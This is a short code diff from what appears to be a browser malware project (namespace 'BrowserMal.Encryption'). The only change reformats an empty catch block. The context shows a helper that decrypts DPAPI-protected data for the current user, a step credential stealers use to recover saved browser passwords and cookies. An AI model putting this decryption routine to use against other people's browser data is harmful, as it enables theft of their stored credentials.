@@ -22,10 +22,8 @@ namespace BrowserMal.Encryption
             {
                 result = Encoding.UTF8.GetString(ProtectedData.Unprotect(encrypted, null, DataProtectionScope.CurrentUser));
             }
-            catch (Exception)
-            {
+            catch (Exception) { }
 
-            }
             return result;
         }
 
